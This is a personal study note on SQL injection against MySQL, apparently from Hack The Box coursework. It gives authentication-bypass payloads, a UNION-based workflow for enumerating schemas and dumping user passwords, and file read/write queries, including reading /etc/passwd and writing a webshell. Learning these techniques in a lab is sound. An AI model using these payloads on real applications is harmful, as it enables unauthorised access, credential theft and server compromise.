---
tags: [basics, technique, web, sql, sqli]
---


> [!info] See also: [[MySQL]] · [[SQLMap]]


## Discovery

![[sqli_discovery.png]]

Common indicators that user input is being concatenated into SQL:
- Adding `'` causes a 500 error or strange behavior.
- Boolean conditions like `' OR 1=1-- -` change the response.
- Time payloads (`SLEEP(5)`) measurably delay the response.


## Connecting to MySQL

```bash 
# Authenticate to mysql for localhost 
mysql -u root -p 

# Authenticate for remote server 
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```


## SQL Refresher

```sql
-- Creating a Database
CREATE DATABASE users;
SHOW DATABASES;
USE user; 


-- Creating a table 
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

SHOW TABLES;

-- Describe keyword is used to list the table structure with its fields and data types 
DESCRIBE logins;


-- Updated form of the Table using proper data types and checks 
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

-- Adding new information using the Insert statement 
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);


-- Insert multiple columns 
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');


-- Alter an already existing table, i.e. adding a new column
ALTER TABLE logins ADD newColumn INT;

-- If you don't want to alter, but rather to update use the UPDATE method
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;


-- Sorting query results 
SELECT * FROM logins ORDER BY password DESC;

-- Sorting by multiple columns 
SELECT * FROM logins ORDER BY password DESC, id ASC;

-- Limit the amount of search results 
SELECT * FROM logins LIMIT 2; 

-- Limit the amount of search results but with an offset 
SELECT * FROM logins LIMIT 1, 2;


-- Using a  WHERE clause to filter for conditions 
SELECT * FROM table_name WHERE <condition>;

-- Using a LIKE clause 
SELECT * FROM logins WHERE username LIKE 'admin%'
```


## Subverting Query Logic 

Auth bypass payloads (each tries to make the WHERE clause always true and comment out the rest):

```
admin' -- -
admin' #
admin'/*
' OR 1=1-- -
' OR 'a'='a
' OR 1=1 LIMIT 1-- -
```

Note the trailing `-- -` for MySQL — the space after `--` is mandatory; the extra `-` helps avoid empty-comment edge cases.


## UNION-based Injection 

Workflow:
1. Determine the number of columns using `ORDER BY n--` (increase `n` until error).
2. Confirm with `UNION SELECT 1,2,3,...,n-- -` to find which columns are reflected.
3. Replace the reflected column(s) with subqueries against `INFORMATION_SCHEMA`.

```sql
-- Discover number of columns
' ORDER BY 4-- -
' UNION SELECT 1,2,3,4-- -

-- Schema enumeration
' UNION select 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
' UNION select 1,database(),3,4-- -

-- Table enumeration in a specific schema
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

-- Column enumeration in a specific table
' UNION select 1,COLUMN_NAME,TABLE_SCHEMA,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -

-- Final dump
' UNION select 1,username,password,3 FROM ilfreight.users-- -

-- Alternate count form
SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;
```


## Privilege Discovery & File I/O

Once injection is established, check for `FILE` privilege — read/write to the filesystem may be possible:

```sql
-- Check super privileges
SELECT super_priv FROM mysql.user
UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root";

-- Read a file
SELECT LOAD_FILE('/etc/passwd');

-- secure_file_priv controls where INTO OUTFILE can write
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";

-- Dump credentials into a file (also useful for webshell upload if webroot is writable)
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'payload' INTO OUTFILE '/var/www/html/shell.php';
```


## Practice Snippets

```
username='admin' || id = 5)-- AND id > 1


' UNION select 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -


' UNION select 1,database(),3,4-- -

' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -


' UNION select 1,COLUMN_NAME,TABLE_SCHEMA,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -


' UNION select 1,username,password,3 FROM ilfreight.users-- -
```
